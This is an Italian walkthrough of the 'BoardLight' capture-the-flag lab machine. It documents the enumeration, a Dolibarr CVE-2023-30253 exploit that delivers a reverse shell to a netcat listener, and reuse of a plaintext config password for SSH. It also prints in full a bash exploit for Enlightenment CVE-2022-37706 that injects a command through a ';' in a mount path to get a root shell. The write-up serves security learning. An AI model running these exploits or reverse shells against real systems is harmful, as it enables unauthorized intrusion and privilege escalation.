---
title: BoardLight Walkthrough
description: BoardLight è una macchina Linux di difficoltà easy che presenta un'istanza Dolibarr vulnerabile a CVE-2023-30253. Questa vulnerabilità viene sfruttata per ottenere l'accesso come www-data. Dopo aver enumerato e dumpato i contenuti del file di configurazione web, delle credenziali in testo chiaro portano all'accesso SSH sulla macchina. Enumerando il sistema, viene identificato un binario SUID relativo a enlightenment che è vulnerabile all'escalation dei privilegi tramite CVE-2022-37706 e può essere abusato per ottenere una shell con privilegi root.
author: dua2z3rr
date: 2025-09-29 1:00:00
categories: [Machines]
tags: ["Area di Interesse: Protocols", "Area di Interesse: Software & OS exploitation", "Area di Interesse: Enterprise Network", "Area di Interesse: Vulnerability Assessment", "Vulnerabilità: Code Injection", "Codice: PHP", "Codice: Bash", "Servizio: Apache", "Servizio: Linux", "Tecnica: Reconnaissance", "Tecnica: Web Site Structure Discovery", "Tecnica: Fuzzing", "Tecnica: SUID Exploitation"]
image: /assets/img/boardLight/boardLight-resized.png
---

## Enumerazione Esterna

### Nmap

Cominciamo con uno scan di nmap:

```shell
┌─[✗]─[dua2z3rr@parrot]─[~]
└──╼ $sudo nmap 10.10.11.11 -vv -p 22,80 -sC -sV
<SNIP>
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 06:2d:3b:85:10:59:ff:73:66:27:7f:0e:ae:03:ea:f4 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDH0dV4gtJNo8ixEEBDxhUId6Pc/8iNLX16+zpUCIgmxxl5TivDMLg2JvXorp4F2r8ci44CESUlnMHRSYNtlLttiIZHpTML7ktFHbNexvOAJqE1lIlQlGjWBU1hWq6Y6n1tuUANOd5U+Yc0/h53gKu5nXTQTy1c9CLbQfaYvFjnzrR3NQ6Hw7ih5u3mEjJngP+Sq+dpzUcnFe1BekvBPrxdAJwN6w+MSpGFyQSAkUthrOE4JRnpa6jSsTjXODDjioNkp2NLkKa73Yc2DHk3evNUXfa+P8oWFBk8ZXSHFyeOoNkcqkPCrkevB71NdFtn3Fd/Ar07co0ygw90Vb2q34cu1Jo/1oPV1UFsvcwaKJuxBKozH+VA0F9hyriPKjsvTRCbkFjweLxCib5phagHu6K5KEYC+VmWbCUnWyvYZauJ1/t5xQqqi9UWssRjbE1mI0Krq2Zb97qnONhzcclAPVpvEVdCCcl0rYZjQt6VI1PzHha56JepZCFCNvX3FVxYzEk=
|   256 59:03:dc:52:87:3a:35:99:34:44:74:33:78:31:35:fb (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBK7G5PgPkbp1awVqM5uOpMJ/xVrNirmwIT21bMG/+jihUY8rOXxSbidRfC9KgvSDC4flMsPZUrWziSuBDJAra5g=
|   256 ab:13:38:e4:3e:e0:24:b4:69:38:a9:63:82:38:dd:f4 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILHj/lr3X40pR3k9+uYJk4oSjdULCK0DlOxbiL66ZRWg
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### HTTP

Visitiamo la porta 80 attraverso il browser.

![Desktop View](/assets/img/boardLight/boardLight-homepage.png)

La pagina è statica e nessun pulsante ci reindirizza in altre pagine.

### ffuf

Aggiungiamo **board.htb** (dome del sito reperibile nel footer della homepage) al file **/etc/hosts**. 

Fuzzing di directory e subdomains non ha successo, ma troviamo qualcosa di interessante nei virtual hosts:

```shell
┌─[dua2z3rr@parrot]─[~]
└──╼ $ffuf -w /home/dua2z3rr/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -u http://board.htb -H 'Host: FUZZ.board.htb' -fw 6243

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://board.htb
 :: Wordlist         : FUZZ: /home/dua2z3rr/SecLists/Discovery/DNS/subdomains-top1million-110000.txt
 :: Header           : Host: FUZZ.board.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response words: 6243
________________________________________________

crm                     [Status: 200, Size: 6360, Words: 397, Lines: 150, Duration: 2219ms]
```

### Virtual Host

Dopo che abbiamo aggiunto il nuovo Vhost al file `/etc/hosts`, accediamoci.

![Desktop View](/assets/img/boardLight/boardLight-crm.png)

Troviamo una pagina di login di **Dolibarr**. Vediamo che questo sito ha la versione **17.0.0**.

> Dolibarr ERP/CRM è un programma multiutente Open source per le piccole e medie imprese, fondazioni e liberi professionisti. Include una serie di funzionalita tipiche degli Enterprise Resource Planning e dei Customer Relationship Management.
{: .prompt-info }

Proviamo ad entrare con le credenziali di default `admin:admin`.

![Desktop View](/assets/img/boardLight/boardLight-dolibarr-admin-dashboard-pre-auth.png)

Siamo entrati, anche se non del tutto. Infatti, non possiamo fare alcun tipo di azione riguardante il sito, come aggiungere una pagina di php custom per una reverse shell.

### Ricerca Exploit

![Desktop View](/assets/img/boardLight/boardLight-exploit-1-readme.png)

Proviamo a utilizzare la vulnerabilità **CVE-2023-30253**.

### Exploit

> Ho usato l'exploit che si trova in questa repository di github: <https://github.com/nikn0laty/Exploit-for-Dolibarr-17.0.0-CVE-2023-30253>
{: .prompt-tip }

```shell
┌─[dua2z3rr@parrot]─[~/boxes/boardLight/Exploit-for-Dolibarr-17.0.0-CVE-2023-30253]
└──╼ $python3 exploit.py http://crm.board.htb admin admin 10.10.16.9 9001
[*] Trying authentication...
[**] Login: admin
[**] Password: admin
[*] Trying created site...
[*] Trying created page...
[*] Trying editing page and call reverse shell... Press Ctrl+C after successful connection
```

```shell
┌─[dua2z3rr@parrot]─[~]
└──╼ $nc -lnvp 9001
Listening on 0.0.0.0 9001
Connection received on 10.10.11.11 56670
bash: cannot set terminal process group (856): Inappropriate ioctl for device
bash: no job control in this shell
www-data@boardlight:~/html/crm.board.htb/htdocs/public/website$
```

### Spiegazione Exploit

Andando all'url `admin_url = args.hostname + "/admin/index.php?mainmenu=home&leftmenu=setup&mesg=setupnotcomplete"` si può ottenere un pre-login-token (cross-site request forgery). Grazie a questo token si può, grazie a delle richieste HTTP accuratamente craftate, creare una nuova pagina php e modificarne il codice per inserirci all'interno una reverse shell.

## Shell come www-data

Prima di eseguire script come **linpeas.sh** per aiutarci nella nostra enumerazione, indaghiamo il sito e i suoi componenti se troviamo qualche tipo di informazione interessante, come un database da cui potremmo ottenere delle credenziali.

Dopo circa 10 minuti, trovo un file chiamato **conf.php** (`/var/www/html/crm.board.htb/htdocs/conf/conf.php`):

```php
<?php
//
// File generated by Dolibarr installer 17.0.0 on May 13, 2024
//
// Take a look at conf.php.example file for an example of conf.php file
// and explanations for all possibles parameters.
//
$dolibarr_main_url_root='http://crm.board.htb';
$dolibarr_main_document_root='/var/www/html/crm.board.htb/htdocs';
$dolibarr_main_url_root_alt='/custom';
$dolibarr_main_document_root_alt='/var/www/html/crm.board.htb/htdocs/custom';
$dolibarr_main_data_root='/var/www/html/crm.board.htb/documents';
$dolibarr_main_db_host='localhost';
$dolibarr_main_db_port='3306';
$dolibarr_main_db_name='dolibarr';
$dolibarr_main_db_prefix='llx_';
$dolibarr_main_db_user='dolibarrowner';
$dolibarr_main_db_pass='serverfun2$2023!!';
$dolibarr_main_db_type='mysqli';
$dolibarr_main_db_character_set='utf8';
$dolibarr_main_db_collation='utf8_unicode_ci';
// Authentication settings
$dolibarr_main_authentication='dolibarr';

//$dolibarr_main_demo='autologin,autopass';
// Security settings
$dolibarr_main_prod='0';
$dolibarr_main_force_https='0';
$dolibarr_main_restrict_os_commands='mysqldump, mysql, pg_dump, pgrestore';
$dolibarr_nocsrfcheck='0';
$dolibarr_main_instance_unique_id='ef9a8f59524328e3c36894a9ff0562b5';
$dolibarr_mailing_limit_sendbyweb='0';
$dolibarr_mailing_limit_sendbycli='0';

//$dolibarr_lib_FPDF_PATH='';
//$dolibarr_lib_TCPDF_PATH='';
//$dolibarr_lib_FPDI_PATH='';
//$dolibarr_lib_TCPDI_PATH='';
//$dolibarr_lib_GEOIP_PATH='';
//$dolibarr_lib_NUSOAP_PATH='';
//$dolibarr_lib_ODTPHP_PATH='';
//$dolibarr_lib_ODTPHP_PATHTOPCLZIP='';
//$dolibarr_js_CKEDITOR='';
//$dolibarr_js_JQUERY='';
//$dolibarr_js_JQUERY_UI='';

//$dolibarr_font_DOL_DEFAULT_TTF='';
//$dolibarr_font_DOL_DEFAULT_TTF_BOLD='';
$dolibarr_main_distrib='standard';
```

Troviamo la password in questo file. Proviamo ad accedere allo user **larissa** tramite ssh con questa password.

```shell
┌─[dua2z3rr@parrot]─[~/boxes/boardLight]
└──╼ $ssh larissa@10.10.11.11
The authenticity of host '10.10.11.11 (10.10.11.11)' can't be established.
ED25519 key fingerprint is SHA256:xngtcDPqg6MrK72I6lSp/cKgP2kwzG6rx2rlahvu/v0.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.11.11' (ED25519) to the list of known hosts.
larissa@10.10.11.11's password: 

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

larissa@boardlight:~$ ls -al
total 76
drwxr-x--- 15 larissa larissa 4096 May 17  2024 .
drwxr-xr-x  3 root    root    4096 May 17  2024 ..
lrwxrwxrwx  1 root    root       9 Sep 18  2023 .bash_history -> /dev/null
-rw-r--r--  1 larissa larissa  220 Sep 17  2023 .bash_logout
-rw-r--r--  1 larissa larissa 3771 Sep 17  2023 .bashrc
drwx------  2 larissa larissa 4096 Sep 29 11:20 .cache
drwx------ 12 larissa larissa 4096 May 17  2024 .config
drwxr-xr-x  3 larissa larissa 4096 May 17  2024 .local
lrwxrwxrwx  1 larissa larissa    9 Sep 18  2023 .mysql_history -> /dev/null
-rw-r--r--  1 larissa larissa  807 Sep 17  2023 .profile
drwx------  2 larissa larissa 4096 May 17  2024 .run
drwx------  2 larissa larissa 4096 May 17  2024 .ssh
drwxr-xr-x  2 larissa larissa 4096 May 17  2024 Desktop
drwxr-xr-x  2 larissa larissa 4096 May 17  2024 Documents
drwxr-xr-x  3 larissa larissa 4096 May 17  2024 Downloads
drwxr-xr-x  2 larissa larissa 4096 May 17  2024 Music
drwxr-xr-x  2 larissa larissa 4096 May 17  2024 Pictures
drwxr-xr-x  2 larissa larissa 4096 May 17  2024 Public
drwxr-xr-x  2 larissa larissa 4096 May 17  2024 Templates
drwxr-xr-x  2 larissa larissa 4096 May 17  2024 Videos
-rw-r-----  1 root    larissa   33 Sep 29 08:09 user.txt
```

## Shell come larissa

A differenza della maggior parte delle box precedenti, non possiamo eseguire nessun binary come sudo.

```shell
larissa@boardlight:~$ sudo -l
[sudo] password for larissa: 
Sorry, user larissa may not run sudo on localhost.
```

Eseguiamo allora **LinPEAS**.

```shell
                               ╔═══════════════════╗
═══════════════════════════════╣ Interesting Files ╠═══════════════════════════════
                               ╚═══════════════════╝
╔══════════╣ SUID - Check easy privesc, exploits and write perms
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid
-rwsr-xr-x 1 root root 15K Jul  8  2019 /usr/lib/eject/dmcrypt-get-device
-rwsr-sr-x 1 root root 15K Apr  8  2024 /usr/lib/xorg/Xorg.wrap
-rwsr-xr-x 1 root root 27K Jan 29  2020 /usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_sys (Unknown SUID binary!)
-rwsr-xr-x 1 root root 15K Jan 29  2020 /usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_ckpasswd (Unknown SUID binary!)
-rwsr-xr-x 1 root root 15K Jan 29  2020 /usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_backlight (Unknown SUID binary!)
-rwsr-xr-x 1 root root 15K Jan 29  2020 /usr/lib/x86_64-linux-gnu/enlightenment/modules/cpufreq/linux-gnu-x86_64-0.23.1/freqset (Unknown SUID binary!)
```

> linPEAS ci informa che ci sono molti altri modi per effettuare una privilege escalation sulla macchina (tra cui 2 vulnerabilità con successo qualsi garantito), ma noi ci attenderemo al modo che la box vuole farci intraprendere.
{: .prompt-warning }

Notiamo la presenza di un **SUID** su questi 4 file. Questo vuol dire che questi 4 file verranno **SEMPRE** eseguiti come l'owner del file (in questo caso, root).

### Enlightment

> Enlightenment is an advanced window manager for X11. Unique features include: a fully animated background, nice drop shadows around windows, backed by an extremely clean and optimized foundation of APIs.

Enlightenment è quindi un window manager / desktop environment per linux. Serve per montare o smontare dispositivi, come chiavette USB, CD-ROM, partizioni, ecc.

Proviamo a ottenere la versione di **enlightenment** sulla macchina.

```shell
larissa@boardlight:~$ enlightenment -h
ESTART: 0.00001 [0.00001] - Begin Startup
ESTART: 0.00007 [0.00006] - Signal Trap
ESTART: 0.00008 [0.00002] - Signal Trap Done
ESTART: 0.00010 [0.00002] - Eina Init
ESTART: 0.00045 [0.00035] - Eina Init Done
ESTART: 0.00049 [0.00003] - Determine Prefix
ESTART: 0.00062 [0.00014] - Determine Prefix Done
ESTART: 0.00064 [0.00001] - Environment Variables
ESTART: 0.00065 [0.00001] - Environment Variables Done
ESTART: 0.00066 [0.00001] - Parse Arguments
Options:
	-display DISPLAY
		Connect to display named DISPLAY.
		EG: -display :1.0
	-fake-xinerama-screen WxH+X+Y
		Add a FAKE xinerama screen (instead of the real ones)
		given the geometry. Add as many as you like. They all
		replace the real xinerama screens, if any. This can
		be used to simulate xinerama.
		EG: -fake-xinerama-screen 800x600+0+0 -fake-xinerama-screen 800x600+800+0
	-profile CONF_PROFILE
		Use the configuration profile CONF_PROFILE instead of the user selected default or just "default".
	-good
		Be good.
	-evil
		Be evil.
	-psychotic
		Be psychotic.
	-locked
		Start with desklock on, so password will be asked.
	-i-really-know-what-i-am-doing-and-accept-full-responsibility-for-it
		If you need this help, you don't need this option.
	-version
E: Begin Shutdown Procedure!
```

Utilizziamo il cmando con la flag `-version`.

```shell
larissa@boardlight:~$ enlightenment -version
ESTART: 0.00001 [0.00001] - Begin Startup
ESTART: 0.00024 [0.00023] - Signal Trap
ESTART: 0.00036 [0.00012] - Signal Trap Done
ESTART: 0.00046 [0.00010] - Eina Init
ESTART: 0.00087 [0.00041] - Eina Init Done
ESTART: 0.00096 [0.00009] - Determine Prefix
ESTART: 0.00117 [0.00021] - Determine Prefix Done
ESTART: 0.00123 [0.00006] - Environment Variables
ESTART: 0.00128 [0.00005] - Environment Variables Done
ESTART: 0.00133 [0.00005] - Parse Arguments
Version: 0.23.1
E: Begin Shutdown Procedure!
```

### Ricerca Exploit

La vulnerabilità che utilizzeremo per ottenere privilegi di root su questa box è la **CVE-2022-37706**.

Io ho utilizzato questo exploit: <https://github.com/MaherAzzouzi/CVE-2022-37706-LPE-exploit>

### Spiegazione dell'exploit:

```shell
#!/bin/bash

echo "CVE-2022-37706"
echo "[*] Trying to find the vulnerable SUID file..."
echo "[*] This may take few seconds..."

file=$(find / -name enlightenment_sys -perm -4000 2>/dev/null | head -1)
if [[ -z ${file} ]]
then
	echo "[-] Couldn't find the vulnerable SUID file..."
	echo "[*] Enlightenment should be installed on your system."
	exit 1
fi

echo "[+] Vulnerable SUID binary found!"
echo "[+] Trying to pop a root shell!"
mkdir -p /tmp/net
mkdir -p "/dev/../tmp/;/tmp/exploit"

echo "/bin/sh" > /tmp/exploit
chmod a+x /tmp/exploit
echo "[+] Enjoy the root shell :)"
${file} /bin/mount -o noexec,nosuid,utf8,nodev,iocharset=utf8,utf8=0,utf8=1,uid=$(id -u), "/dev/../tmp/;/tmp/exploit" /tmp///net
```

L'exploit è molto comprensibile eccetto la ultima riga. Tutte le righe prima rispetto a quest'ultima sono dei messaggi di output per l'attaccante. Ora parliamo dell'ultima riga:

`${file} /bin/mount -o noexec,nosuid,utf8,nodev,iocharset=utf8,utf8=0,utf8=1,uid=$(id -u), "/dev/../tmp/;/tmp/exploit" /tmp///net`

- `${file}` esegue il file binary vulnerabile (**enlightenment_sys**)
- `/bin/mount -o ...` passa come argomento il comando **mount** a **enlightenment_sys**.
- La vulnerabilità si basa sulla mancata sanitizzazione dei parametri passati al comando mount, in particolare il path del device da montare. Con il carattere `;` si può concatenare comandi come root.
- `/dev/../tmp/;/tmp/exploit`. Questa è la parte cruciale: 
  1. il path contiene un punto e virgola
  2. Dopo la normalizzazione di /dev/../tmp il path diventa /tmp
  3. Il sistema reinterpreta il carattere ; come separatore di comandi
  4. Viene montato sia /tmp che /tmp/exploit
- `/tmp/exploit` contiene `/bin/sh` e viene eseguito per ottenere privilegi root.

### Exploit

```shell
larissa@boardlight:~$ ./exploit3.sh 
CVE-2022-37706
[*] Trying to find the vulnerable SUID file...
[*] This may take few seconds...
[+] Vulnerable SUID binary found!
[+] Trying to pop a root shell!
[+] Enjoy the root shell :)
mount: /dev/../tmp/: can't find in /etc/fstab.
# whoami
root
#
```

Prendiamo la root flag e terminiamo la box.
